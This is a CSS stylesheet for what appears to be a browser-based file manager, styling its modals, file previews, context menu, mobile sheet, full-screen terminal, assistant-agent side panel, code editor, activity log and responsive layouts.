.mod{background:var(--surf);border:1px solid var(--border2);border-radius:var(--rlg);display:flex;flex-direction:column;overflow:hidden;animation:fadeUp .3s var(--spring) both;max-height:88vh}
.mod-sm{width:min(400px,92vw)}.mod-md{width:min(560px,94vw)}.mod-lg{width:min(760px,95vw)}
.perm-t{border-collapse:collapse;font-size:12.5px}.perm-t th{text-align:center;color:var(--t3);font-weight:600;font-size:10.5px;text-transform:uppercase;letter-spacing:.5px;padding:4px 8px}.perm-t td{text-align:center;padding:6px 8px;color:var(--t2)}.perm-t td:first-child{text-align:left;font-weight:600;color:var(--t1)}.perm-t input[type=checkbox]{width:16px;height:16px;cursor:pointer}
@keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
.mod-head{display:flex;align-items:center;gap:9px;padding:10px 14px;border-bottom:1px solid var(--border);background:var(--raised);flex-shrink:0}
.mod-icon{width:24px;height:24px;border-radius:7px;display:flex;align-items:center;justify-content:center;background:rgba(133,137,140,.15);flex-shrink:0}
.mod-icon svg{width:13px;height:13px;stroke:var(--link);fill:none;stroke-width:2;stroke-linecap:round}
.mod-title{font-size:13px;font-weight:700;color:var(--t1);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.mod-body{overflow:auto;flex:1;padding:13px}
.mod-body::-webkit-scrollbar{width:4px}.mod-body::-webkit-scrollbar-thumb{background:rgba(255,255,255,.08);border-radius:6px}

/* ══ PREVIEW ══ */
.prev-ov{display:none;position:fixed;inset:0;z-index:300;background:rgba(0,0,0,.85);backdrop-filter:blur(10px);align-items:center;justify-content:center;padding:20px}
.prev-ov.open{display:flex}
.prev-box{background:var(--surf);border:1px solid var(--border2);border-radius:var(--rlg);max-width:min(920px,94vw);max-height:92vh;display:flex;flex-direction:column;overflow:hidden;animation:fadeUp .3s var(--spring) both}
.prev-head{display:flex;align-items:center;gap:10px;padding:11px 14px;border-bottom:1px solid var(--border);background:var(--raised)}
.prev-head span{font-size:13px;font-weight:600;color:var(--t1);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.prev-body{overflow:auto;display:flex;align-items:center;justify-content:center;background:#000;min-height:200px}
.prev-body img{max-width:100%;max-height:80vh;display:block}
.prev-body video{max-width:100%;max-height:80vh}
.prev-body iframe{width:min(870px,90vw);height:77vh;border:none;background:#fff}
.prev-body pre{width:min(870px,90vw);max-height:77vh;overflow:auto;padding:18px;font-family:'JetBrains Mono',monospace;font-size:12.5px;color:#cdd6f4;background:#07090e;text-align:left;white-space:pre-wrap;word-break:break-word}
.prev-body .md-render{width:min(870px,90vw);max-height:77vh;overflow:auto;padding:24px 28px;background:var(--panel);color:var(--t1);text-align:left;border-radius:8px;line-height:1.6;font-size:14px}
.prev-body .md-render h1,.prev-body .md-render h2,.prev-body .md-render h3,.prev-body .md-render h4{margin:18px 0 8px;font-weight:700;color:var(--t1)}
.prev-body .md-render h1{font-size:24px;border-bottom:1px solid var(--border);padding-bottom:6px}
.prev-body .md-render h2{font-size:19px;border-bottom:1px solid var(--border);padding-bottom:5px}
.prev-body .md-render p{margin:8px 0}
.prev-body .md-render code{background:var(--raised);padding:2px 5px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:12.5px}
.prev-body .md-render pre{background:#07090e;padding:14px;border-radius:8px;overflow:auto;width:auto;max-height:none}
.prev-body .md-render pre code{background:none;padding:0}
.prev-body .md-render blockquote{border-left:3px solid var(--indigo);margin:10px 0;padding:2px 14px;color:var(--t2)}
.prev-body .md-render ul,.prev-body .md-render ol{margin:8px 0 8px 22px}
.prev-body .md-render a{color:var(--link)}
.prev-body .md-render hr{border:none;border-top:1px solid var(--border);margin:16px 0}
.prev-body .md-render img{max-width:100%;border-radius:6px}

/* ══ CONTEXT MENU (desktop right-click) ══ */
.ctx{display:none;position:fixed;z-index:500;background:var(--raised);border:1px solid var(--border2);border-radius:var(--rlg);padding:5px;min-width:180px;box-shadow:0 20px 60px rgba(0,0,0,.7),0 4px 16px rgba(0,0,0,.4);animation:ctxIn .18s var(--spring) both}
.ctx.open{display:block}
@keyframes ctxIn{from{opacity:0;transform:scale(.93)}to{opacity:1;transform:none}}
.ctx-item{display:flex;align-items:center;gap:9px;padding:8px 12px;border-radius:8px;color:var(--t2);font-size:12.5px;font-weight:500;cursor:pointer;transition:background .12s,color .12s;white-space:nowrap;user-select:none}
.ctx-item svg{width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0}
.ctx-item:hover{background:var(--hov);color:var(--t1)}.ctx-item.danger:hover{background:rgba(239,68,68,.1);color:#fca5a5}.ctx-item.ctx-disabled{opacity:.4;pointer-events:none}
.ctx-sep{height:1px;background:var(--border);margin:4px 0}
.ctx-header{padding:6px 12px 4px;font-size:10.5px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;display:flex;align-items:center;gap:7px;overflow:hidden;max-width:220px}
.ctx-header span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}

/* ══ MOBILE BOTTOM SHEET ══ */
.sheet-ov{display:none;position:fixed;inset:0;z-index:400;background:rgba(0,0,0,.7);backdrop-filter:blur(8px)}
.sheet-ov.open{display:block}
.sheet{position:fixed;bottom:0;left:0;right:0;background:var(--panel);border-top:1px solid var(--border2);border-radius:20px 20px 0 0;padding:0 0 max(env(safe-area-inset-bottom),16px);z-index:401;transform:translateY(100%);transition:transform .35s var(--spring);max-height:85dvh;overflow-y:auto}
.sheet.open{transform:translateY(0)}
.sheet-handle{width:36px;height:4px;background:rgba(255,255,255,.15);border-radius:4px;margin:12px auto 16px}
.sheet-info{padding:0 16px 14px;border-bottom:1px solid var(--border)}
.sheet-name{font-size:14px;font-weight:700;color:var(--t1);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sheet-meta{font-size:11.5px;color:var(--t2);margin-top:3px;font-family:'JetBrains Mono',monospace}
.sheet-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;padding:12px 12px 0}
.sh-btn{display:flex;flex-direction:column;align-items:center;gap:8px;padding:14px 10px;background:var(--raised);border:1px solid var(--border);border-radius:var(--rlg);cursor:pointer;font-size:12.5px;font-weight:600;color:var(--t2);transition:background .15s,color .15s,transform .18s var(--spring);-webkit-user-select:none;user-select:none}
.sh-btn svg{width:22px;height:22px;stroke:currentColor;fill:none;stroke-width:1.7;stroke-linecap:round}
.sh-btn:active{transform:scale(.95)}
.sh-btn:hover{background:var(--hov);color:var(--t1)}.sh-btn.sh-red:hover{background:rgba(239,68,68,.08);color:#fca5a5;border-color:rgba(239,68,68,.2)}
.sh-btn.sh-blue:hover{background:rgba(59,130,246,.08);color:#93c5fd;border-color:rgba(59,130,246,.2)}
.sh-btn.sh-green:hover{background:rgba(34,197,94,.08);color:#86efac;border-color:rgba(34,197,94,.2)}
.sh-btn.sh-amb:hover{background:rgba(245,158,11,.08);color:#fcd34d;border-color:rgba(245,158,11,.2)}
.sh-btn.sh-purp:hover{background:rgba(139,92,246,.08);color:#c4b5fd;border-color:rgba(139,92,246,.2)}

/* ══ TERMINAL (the supplied DNT Shell layout, full-screen and borderless) ══ */
.term-ov{padding:0;background:#1c1c1c;backdrop-filter:none;align-items:stretch;justify-content:stretch}
.term-ov.open{display:block}
.term-win{position:fixed;inset:0;width:100vw;height:100dvh;background:#1c1c1c;color:#b3b3b3;border:0;border-radius:0;box-shadow:none;overflow-y:auto;overflow-x:hidden;display:block;padding-bottom:35px;box-sizing:border-box;font-family:monospace;font-size:0;line-height:0}
.term-out{display:block;overflow:visible;padding:8px 0 0;font-family:monospace;font-size:0;line-height:0;color:#b3b3b3;background:#1c1c1c;white-space:pre-wrap;word-break:break-word}
.term-out::-webkit-scrollbar{width:5px}.term-out::-webkit-scrollbar-thumb{background:#4a4a4a;border-radius:4px}
.term-line{display:block;font-size:14px;line-height:1.25;min-height:0;margin:0 0 0 2px;white-space:pre-wrap;word-break:break-word}
.term-line.cmd-line{color:#7db8ba}
.term-line.ok-line{color:#b3b3b3}
.term-line.err-line{color:#e88080}
.term-line.info-line{color:#7db8ba;font-style:normal}
.term-line.success-line{color:#5ec97e}
.term-prompt-str{color:#5ec97e}
.term-at{color:#d4d454}
.term-path{color:#7db8ba}
.term-dollar{color:#b3b3b3}
.term-prompt-wrap{position:relative;display:block;background:#1c1c1c;font-size:14px;line-height:normal}
.term-row{display:flex;align-items:center;padding:0;margin:0 0 -2px 2px;background:#1c1c1c;gap:0;font-size:14px;line-height:normal}
.term-ps{font-family:monospace;font-size:14px;line-height:normal;white-space:nowrap;flex-shrink:0}
.term-inp{flex:0 1 auto;width:.1ch;max-width:calc(100vw - 220px);background:transparent;border:none;outline:none;font-family:monospace;font-size:14px;line-height:1;color:#b3b3b3;caret-color:transparent;padding:0;margin:0;resize:none;letter-spacing:0}
.term-inp::placeholder{color:#636363}
.term-cursor{display:inline-block;width:8px;height:14px;background:#b3b3b3;animation:blink 1s step-end infinite;vertical-align:-2px;margin-left:1px;flex-shrink:0}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
.term-suggest{position:absolute;background:#252525;border:1px solid #555;border-radius:4px;padding:4px 0;z-index:9;min-width:180px;box-shadow:0 8px 24px rgba(0,0,0,.6)}
.term-sug-item{padding:5px 12px;font-family:monospace;font-size:12px;color:#d4d454;cursor:pointer;transition:background .1s}
.term-sug-item:hover,.term-sug-item.active{background:#3b3b3b}
.term-footer{position:fixed;left:0;right:0;bottom:0;z-index:1000;display:flex;align-items:center;min-height:25px;height:25px;background:#131313;border:1px solid #636363;padding-left:5px;box-sizing:border-box;overflow:hidden;font-family:monospace;font-size:10px;line-height:1;color:#fff}
.term-footer-item{display:flex;align-items:center;margin-right:8px;white-space:nowrap;font-size:10px!important;line-height:1;flex-shrink:0}
.term-footer-label{display:inline-block;color:#d4d454;font-size:10px!important;line-height:1;font-weight:700;margin:0 3px}
.term-footer-value{display:inline-block;color:#fff;font-size:10px!important;line-height:1;margin-right:3px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:150px}
.term-footer-sep{width:2px;height:60%;background:#7db8ba;margin:0 5px;flex-shrink:0}
.term-footer-graph{width:50px;height:12px;background:#000;border:.5px solid #646464;overflow:hidden;display:inline-block;vertical-align:middle}
.term-footer-graph canvas{width:100%;height:100%;display:block}
.term-win,.term-win *{font-family:'TerminalTMT',monospace!important;font-variant-ligatures:none}
.term-footer-spacer{flex:1}
.term-footer-hide-sm,.term-footer-hide-md,.term-footer-hide-lg{display:none}
@media (min-width:768px){
  .term-footer-hide-sm{display:flex}
  .term-footer-sep.term-footer-hide-sm{display:block}
}
@media (min-width:1024px){
  .term-footer-hide-md{display:flex}
  .term-footer-sep.term-footer-hide-md{display:block}
}
@media (min-width:1280px){
  .term-footer-hide-lg{display:flex}
  .term-footer-sep.term-footer-hide-lg{display:block}
}
/* A terminal opened from the manager gets its own browser tab/window. */
body.term-standalone{background:#1c1c1c;overflow:hidden}
body.term-standalone .shell{display:none!important}
body.term-standalone .mod-ov:not(.term-ov){display:none!important}
body.term-standalone .term-ov{display:block!important;position:fixed;inset:0}
body.term-standalone .term-win{position:fixed;inset:0}

/* ══ ASSISTANT AGENT ══ */
 .shell{--agent-w:420px}
.shell.agent-open .main{margin-right:var(--agent-w);transition:margin-right .2s var(--out)}
 .agent-panel{position:fixed;z-index:170;top:var(--th);right:0;bottom:var(--bh);width:var(--agent-w);min-width:320px;min-height:0;background:var(--panel);border-left:1px solid var(--border2);box-shadow:-18px 0 48px rgba(0,0,0,.26);display:flex;flex-direction:column;transform:translateX(105%);visibility:hidden;transition:transform .28s var(--spring),visibility 0s linear .28s}
.agent-panel.open{transform:translateX(0);visibility:visible;transition:transform .28s var(--spring),visibility 0s}
.agent-resize{position:absolute;left:-5px;top:0;bottom:0;width:10px;cursor:col-resize;z-index:4}
.agent-resize::after{content:'';position:absolute;left:4px;top:50%;width:2px;height:48px;border-radius:2px;background:var(--border2);transform:translateY(-50%);transition:height .15s,background .15s}
.agent-resize:hover::after,.agent-panel.resizing .agent-resize::after{height:76px;background:var(--indigo)}
.agent-head{display:flex;align-items:center;gap:10px;padding:12px 14px;border-bottom:1px solid var(--border);background:linear-gradient(135deg,var(--raised),var(--panel));flex-shrink:0}
 .agent-mark{width:30px;height:30px;border-radius:0;display:flex;align-items:center;justify-content:center;color:#c4b5fd;background:none;border:0;box-shadow:none;flex-shrink:0}
.agent-mark svg{width:18px;height:18px;fill:none;stroke:currentColor;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
 .agent-head-copy{flex:1;min-width:0}
 .agent-head-title{font-size:13px;font-weight:700;color:var(--t1);line-height:1.2}.agent-head-sub{font-size:10.5px;color:var(--t3);margin-top:2px}
 .agent-head-actions{display:flex;align-items:center;gap:3px;flex-shrink:0}
 .agent-head-actions .btn{width:28px;height:28px;min-width:28px;padding:4px;margin:0;background:none;border:0;border-radius:50%;box-shadow:none;color:var(--t3);transform:none}
 .agent-head-actions .btn:hover{background:none;border:0;color:var(--t1);transform:none;box-shadow:none}
 .agent-head-actions .btn:focus-visible{outline:2px solid var(--t2);outline-offset:2px}
 .agent-head-actions .btn svg{width:17px;height:17px;stroke-width:1.8}
@keyframes agentPulse{50%{opacity:.35;transform:scale(.75)}}
.agent-settings{padding:12px 14px;border-bottom:1px solid var(--border);background:rgba(139,92,246,.045);flex-shrink:0}
.agent-settings[hidden]{display:none}.agent-settings-title{font-size:11.5px;font-weight:700;color:var(--t1);margin-bottom:4px}
.agent-settings p{font-size:10.5px;line-height:1.45;color:var(--t3);margin:0 0 9px}.agent-key-row{display:flex;gap:6px}
.agent-key-row input{min-width:0;flex:1;height:31px;padding:6px 9px;background:var(--field);border:1px solid var(--border2);border-radius:7px;color:var(--t1);font:11px 'JetBrains Mono',monospace;outline:0}
.agent-key-row input:focus{border-color:rgba(139,92,246,.6)}.agent-key-state{font-size:10px;color:var(--green);margin-top:7px}.agent-key-state.empty{color:var(--t3)}
.agent-key-link{font-size:10px;color:#a78bfa;display:inline-block;margin-top:5px}.agent-key-link:hover{color:#c4b5fd}
 .agent-messages{flex:1;min-height:0;overflow-y:auto;overflow-anchor:none;overscroll-behavior:contain;padding:16px 14px 24px;display:flex;flex-direction:column;gap:12px;scroll-behavior:auto}
.agent-messages::-webkit-scrollbar{width:4px}.agent-messages::-webkit-scrollbar-thumb{background:var(--border2);border-radius:5px}
.agent-welcome{text-align:center;padding:26px 18px 18px;color:var(--t2)}
 .agent-welcome-icon{width:56px;height:56px;display:flex;align-items:center;justify-content:center;margin:0 auto 10px;background:none;color:var(--t1);border:0}
 .agent-welcome-icon svg{width:37px;height:37px;fill:none;stroke:currentColor;stroke-width:1.45;stroke-linecap:round;stroke-linejoin:round}
.agent-welcome strong{display:block;color:var(--t1);font-size:14px;margin-bottom:5px}.agent-welcome p{font-size:11.5px;line-height:1.6;color:var(--t3)}
.agent-msg{display:flex;gap:8px;align-items:flex-start;animation:agentIn .25s var(--spring) both}
@keyframes agentIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
.agent-msg.user{justify-content:flex-end}.agent-msg.user .agent-bubble{background:var(--raised);border:1px solid var(--border2);color:var(--t1);border-radius:13px 13px 4px 13px;max-width:88%}
.agent-msg.assistant .agent-bubble{background:transparent;color:var(--t1);max-width:100%;padding:1px 0}
.agent-bubble{padding:9px 11px;font-size:12.5px;line-height:1.58;white-space:pre-wrap;word-break:break-word}
.agent-avatar{width:23px;height:23px;border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0;background:rgba(139,92,246,.13);color:#c4b5fd;margin-top:1px}
.agent-avatar svg{width:14px;height:14px;fill:none;stroke:currentColor;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
.agent-action{margin-left:31px;border:1px solid var(--border);border-radius:9px;background:var(--raised);overflow:hidden;animation:agentIn .25s var(--spring) both}
 .agent-action summary{position:relative;overflow:hidden;list-style:none;display:flex;align-items:center;gap:7px;padding:8px 10px;cursor:pointer;color:var(--t2);font-size:11px;font-weight:600;user-select:none}
.agent-action summary::-webkit-details-marker{display:none}.agent-action summary::before{content:'›';font-family:monospace;font-size:17px;line-height:10px;color:var(--t3);transition:transform .15s}.agent-action[open] summary::before{transform:rotate(90deg)}
 .agent-action.is-revealing summary::after{content:'';position:absolute;top:-20%;left:105%;width:42%;height:140%;background:linear-gradient(100deg,transparent,rgba(255,255,255,.48),transparent);transform:skewX(-18deg);pointer-events:none;animation:agentActionShimmer 1s ease-in-out infinite}
 @keyframes agentActionShimmer{from{left:105%}to{left:-55%}}
.agent-action .action-pip{width:6px;height:6px;border-radius:50%;background:var(--green);flex-shrink:0}.agent-action.failed .action-pip{background:var(--red)}
.agent-action .action-detail{border-top:1px solid var(--border);padding:9px 10px;font-family:'JetBrains Mono',monospace;font-size:10.5px;line-height:1.5;color:var(--t2);white-space:pre-wrap;word-break:break-word;max-height:190px;overflow:auto}
.agent-action .action-command{color:#c4b5fd;margin-bottom:6px}.agent-action .action-command::before{content:'$ ';color:var(--t3)}
.agent-typing{display:flex;align-items:center;gap:5px;padding:4px 0 5px 31px;color:var(--t3);font-size:11px}
.agent-typing i{width:5px;height:5px;border-radius:50%;background:currentColor;animation:agentDot 1s ease-in-out infinite}.agent-typing i:nth-child(2){animation-delay:.15s}.agent-typing i:nth-child(3){animation-delay:.3s}
@keyframes agentDot{0%,60%,100%{opacity:.25;transform:translateY(0)}30%{opacity:1;transform:translateY(-3px)}}
.agent-error{display:flex;align-items:flex-start;gap:8px;padding:10px;border:1px solid rgba(239,68,68,.22);background:rgba(239,68,68,.07);border-radius:9px;color:#fca5a5;font-size:11.5px;line-height:1.5}
.agent-error button{margin-left:auto;flex-shrink:0}
 .agent-compose{position:relative;z-index:2;padding:10px 12px 12px;border-top:0;background:var(--panel);flex-shrink:0}
 .agent-compose::before{content:'';position:absolute;left:0;right:0;top:-34px;height:34px;background:linear-gradient(to bottom,transparent,var(--panel));pointer-events:none}
   .agent-compose-box{position:relative;display:flex;align-items:flex-start;gap:10px;min-height:84px;padding:10px;background:var(--raised);border:1px solid rgba(220,220,220,.11);border-radius:18px;transition:border-color .18s,box-shadow .18s}
.agent-compose-box:focus-within{border-color:rgba(139,92,246,.55);box-shadow:0 0 0 3px rgba(139,92,246,.1)}
   .agent-compose textarea{width:100%;min-height:56px;max-height:120px;resize:none;border:0;outline:0;background:transparent;color:var(--t1);font:12.5px/1.5 'Inter',sans-serif;padding:2px 0}
   .agent-compose textarea::placeholder{color:rgba(185,185,185,.38)}.agent-send{align-self:flex-end;width:30px;height:30px;margin:0;padding:0;border:0;outline:0;box-shadow:none;border-radius:50%;background:#8b5cf6;color:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;appearance:none}
 .agent-send:hover{background:#7c3aed;transform:translateY(-1px)}.agent-send:focus,.agent-send:focus-visible{outline:0;box-shadow:none}.agent-send:disabled{opacity:.45;cursor:wait;transform:none}.agent-send svg{width:14px;height:14px}
.agent-compose-hint{font-size:9.5px;color:var(--t3);padding:6px 3px 0;display:flex;justify-content:space-between}.agent-cwd{font-family:'JetBrains Mono',monospace;max-width:65%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
/* Neutral assistant treatment: actions read like a conversation timeline,
   not coloured cards competing with the file manager. */
 .agent-panel .agent-mark,.agent-panel .agent-welcome-icon{color:#d0d0d0;background:none;border-color:transparent;box-shadow:none}
.agent-panel .agent-resize:hover::after,.agent-panel.resizing .agent-resize::after{background:#b8b8b8}
.agent-panel .agent-action{margin-left:31px;border:0;border-left:1px solid #4c4c4c;border-radius:0;background:transparent;box-shadow:none}
.agent-panel .agent-action summary{padding:5px 0 5px 11px;color:#bdbdbd;font-weight:500}
.agent-panel .agent-action summary::before{color:#858585}.agent-panel .agent-action .action-pip{background:#aaa}.agent-panel .agent-action.failed .action-pip{background:#666}
.agent-panel .agent-action .action-detail{border-top:1px solid #383838;padding:8px 0 8px 11px;color:#a9a9a9;max-height:180px}
.agent-panel .agent-action .action-command{color:#d0d0d0}.agent-panel .agent-action .action-command::before{color:#777}
.agent-panel .agent-send{background:#bcbcbc;color:#151515}.agent-panel .agent-send:hover{background:#d2d2d2}
.agent-panel .agent-avatar{background:#292929;color:#cfcfcf}.agent-panel .agent-error{border-color:#555;background:#292929;color:#c7c7c7}
.agent-panel .agent-error .btn-red,.agent-panel .agent-key-row .btn-blue{background:#bcbcbc;color:#151515;border-color:#aaa}
.agent-panel .agent-error .btn-red:hover,.agent-panel .agent-key-row .btn-blue:hover{background:#d2d2d2}
.agent-panel .agent-key-link{color:#c2c2c2}.agent-panel .agent-key-link:hover{color:#fff}
.agent-panel .agent-settings{background:#242424;border-bottom-color:#4a4a4a}.agent-panel .agent-key-state{color:#bdbdbd}.agent-panel .agent-key-state.empty{color:#898989}
.agent-panel .agent-key-row input:focus{border-color:#9b9b9b}.agent-panel .agent-compose-box:focus-within{border-color:#999;box-shadow:0 0 0 3px rgba(160,160,160,.1)}
@media(max-width:768px){
  .agent-panel{top:var(--th);bottom:var(--bh);width:100%;min-width:0}
  .shell.agent-open .main{margin-right:0}
  .agent-resize{left:auto;right:0;cursor:ew-resize}
  .agent-resize::after{left:auto;right:4px}
}

/* ══ EDITOR ══ */
.ed-card{background:var(--surf);border:1px solid var(--border);border-radius:var(--rlg);overflow:hidden;animation:fadeUp .3s var(--spring) both}
.ed-head{display:flex;align-items:center;flex-wrap:wrap;gap:8px;padding:10px 14px;background:var(--raised);border-bottom:1px solid var(--border)}
.ed-fname{display:flex;align-items:center;gap:7px;font-family:'JetBrains Mono',monospace;font-size:12.5px;font-weight:600;color:var(--t1)}
.ed-fname svg{width:14px;height:14px;stroke:var(--indigo);fill:none;stroke-width:2;stroke-linecap:round}
.ed-meta{font-size:11px;font-weight:var(--fw-muted);color:var(--t3);font-family:'JetBrains Mono',monospace;margin-left:auto}
textarea.code{display:block;width:100%;min-height:520px;background:#070a10;color:#cdd6f4;border:none;padding:18px 20px;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.85;resize:vertical;outline:none;tab-size:4;transition:box-shadow .2s}
.ed-tools{display:flex;align-items:center;gap:6px;flex-wrap:wrap;padding:8px 12px;background:var(--raised);border-bottom:1px solid var(--border)}
.ed-tools .inp{height:30px;font-size:11px;min-width:130px}
.ed-wrap{display:grid;grid-template-columns:52px 1fr;background:#070a10;overflow:hidden}
.ed-lines{padding:18px 10px 18px 0;text-align:right;color:#515b70;background:#0b0f18;border-right:1px solid #1d2635;font:13px/1.85 'JetBrains Mono',monospace;user-select:none;overflow:hidden}
.ed-wrap textarea.code{min-height:520px;resize:vertical}
.ed-dirty{color:#fbbf24;font-size:11px;font-weight:600;display:none}.ed-dirty.show{display:inline}
textarea.code:focus{box-shadow:inset 0 0 0 1.5px rgba(133,137,140,.45)}
.ed-foot{padding:9px 14px;background:var(--raised);border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:6px}
.ed-hint{font-size:11px;font-weight:var(--fw-muted);color:var(--t3);font-family:'JetBrains Mono',monospace}
kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padding:1px 5px;font-size:10px;font-family:'JetBrains Mono',monospace;color:var(--t2)}

/* ══ HASH / INFO / LOG ══ */
.hash-r{display:flex;flex-direction:column;gap:3px;margin-bottom:10px;padding:11px;background:var(--raised);border-radius:var(--r);border:1px solid var(--border)}
.hash-l{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3)}
.hash-v{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--link);word-break:break-all;cursor:pointer;transition:color .15s}
.hash-v:hover{color:#a5b4fc}
.info-g{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px}
.info-c{background:var(--raised);border:1px solid var(--border);border-radius:var(--r);padding:12px}
.info-cl{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3);margin-bottom:4px}
.info-cv{font-family:'JetBrains Mono',monospace;font-size:13.5px;font-weight:700;color:var(--t1)}
.info-cs{font-size:10.5px;font-weight:var(--fw-muted);color:var(--t2);margin-top:2px}
.ext-wrap{display:flex;flex-wrap:wrap;gap:4px;margin-top:8px}
.ext-tag{background:var(--raised);border:1px solid var(--border);border-radius:5px;padding:2px 7px;font-size:10.5px;font-family:'JetBrains Mono',monospace;color:var(--t2)}
.log-t{width:100%;border-collapse:collapse}
.log-t th{text-align:left;font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--t3);padding:7px 10px;border-bottom:1px solid var(--border)}
.log-t td{padding:8px 10px;border-bottom:1px solid rgba(255,255,255,.03);font-size:12px;vertical-align:middle}
.log-t tr:last-child td{border-bottom:none}.log-t tbody tr:hover td{background:var(--hov)}
.la{display:inline-block;padding:2px 7px;border-radius:5px;font-size:10px;font-weight:700;font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.4px}
.la.upload,.la.create{background:rgba(34,197,94,.1);color:#86efac}.la.trash,.la.bulk_delete{background:rgba(239,68,68,.1);color:#fca5a5}
.la.rename,.la.duplicate,.la.batch_rename{background:rgba(245,158,11,.1);color:#fcd34d}.la.edit,.la.mkdir{background:rgba(133,137,140,.1);color:#C7C8C8}
.la.terminal{background:rgba(139,92,246,.1);color:#c4b5fd}.la.restore,.la.zip_extract,.la.tar_extract{background:rgba(6,182,212,.1);color:#67e8f9}

/* ══ EMPTY ══ */
.empty{text-align:center;padding:56px 20px}
.empty svg{width:44px;height:44px;stroke:var(--t3);fill:none;stroke-width:1.5;stroke-linecap:round;margin:0 auto 12px;display:block}
.empty p{color:var(--t3);font-size:14px;font-weight:var(--fw-muted)}

/* ══ SCROLLBAR ══ */
::-webkit-scrollbar{width:5px;height:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:rgba(255,255,255,.08);border-radius:6px}::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,.14)}

/* ══ MENU BTN ══ */
.menu-btn{display:none}

/* ══ RESPONSIVE ══ */
@media(max-width:1100px){
  :root{--sw:220px}
  .nt{max-width:180px}
}
@media(min-width:769px) and (max-width:1100px){
  .bc a{max-width:90px}
  .tsearch input{width:120px}
}
@media(max-width:768px){
  :root{--sw:0px;--th:54px;--bh:28px}
  .shell{grid-template:"tb" var(--th) "main" 1fr "bar" var(--bh) / 1fr}
  .topbar{padding:0 max(8px,env(safe-area-inset-left)) 0 max(8px,env(safe-area-inset-right));gap:4px;min-height:var(--th)}
  .brand{width:auto;max-width:130px;flex:0 1 auto;overflow:hidden}
  .bc{display:none}.menu-btn{display:flex!important;min-width:40px;min-height:40px}
  .tb-right .dv{display:none}
  .tb-right .btn-sm span{display:none}
  .tb-right > span{display:none}
  .tb-right{gap:4px;min-width:0;margin-left:auto}
  /* Keep only compact, evenly sized touch targets on mobile. The text
     labels disappear, while the icons remain easy to tap and never compete
     with the menu button or logo for horizontal space. */
  .topbar .tb-right .btn,
  .topbar .tb-right .btn-sm,
  .topbar .tb-right .btn-icon{width:32px;min-width:32px;height:32px;min-height:32px;padding:5px;border-radius:8px}
  .topbar .tb-right .btn svg,
  .topbar .tb-right .btn-sm svg,
  .topbar .tb-right .btn-icon svg{width:12px;height:12px}
  .tb-right .top-fav,.tb-right #viewBtn,.tb-right .top-up{display:none}
  #usersBtn{display:none}
  .tsearch{display:none}
  .sidebar{position:fixed;top:var(--th);left:0;width:min(88vw,300px);height:calc(100dvh - var(--th));z-index:160;transform:translateX(-100%);transition:transform .32s var(--spring);border-right:1px solid var(--border2);box-shadow:16px 0 60px rgba(0,0,0,.8);padding-bottom:env(safe-area-inset-bottom)}
  .sidebar.open{transform:translateX(0)}
  .sb-item{padding:11px 12px;min-height:44px}.sb-flink{padding:9px 12px;min-height:40px}
  .content{padding:10px}
  /* Hide table cols on mobile */
  .col-perms,.col-perms-td,.col-mtime,.col-mtime-td{display:none}
  .ft td,.ft th{padding:11px 10px}
  .nt{max-width:none;flex:1}
  .nc{gap:9px}
  /* Hide table actions, use sheet instead */
  .acts{display:none}
  .bar{padding:0 10px;gap:10px;overflow-x:auto;overflow-y:hidden;white-space:nowrap}.bs{font-size:10px;flex-shrink:0}.br{gap:10px;flex-shrink:0}
  .bulk-bar{width:calc(100% - 20px);left:10px;right:10px;transform:translate(0,130%);flex-wrap:wrap;padding:10px;gap:6px}
  .bulk-bar.show{transform:translate(0,0)}.bulk-bar .btn{min-height:40px}
  .mod,.prev-box{max-height:90dvh}
  .info-g{grid-template-columns:1fr}
  textarea.code{min-height:360px}
  .gv{grid-template-columns:repeat(auto-fill,minmax(92px,1fr))}
  .toolbar{padding:8px 10px;gap:6px}
  /* Show 2-col on mobile toolbar */
  .toolbar .tb-row{display:flex;align-items:center;flex-wrap:wrap!important;gap:6px;width:100%}
  .toolbar .tb-row .upl-lbl,.toolbar .tb-row .btn-sm{height:40px;min-height:40px}
  .toolbar .tb-row .upl-lbl{flex:0 0 auto}.toolbar .tb-row .inp{flex:1;min-height:40px;height:40px;padding:9px 11px}.toolbar .tb-row .btn-sm{flex-shrink:0}
}
@media(max-width:430px){
  :root{--th:50px}
  .topbar{padding-left:max(8px,env(safe-area-inset-left));padding-right:max(8px,env(safe-area-inset-right));gap:3px}
  .menu-btn{min-width:36px!important;width:36px;min-height:36px!important;height:36px!important}
  .brand-icon,.brand-icon img{width:29px;height:29px}
  .tb-right{gap:3px}
  .topbar .tb-right .btn,
  .topbar .tb-right .btn-sm,
  .topbar .tb-right .btn-icon{width:30px;min-width:30px;height:30px;min-height:30px;padding:4px}
  .brand-name{display:none}
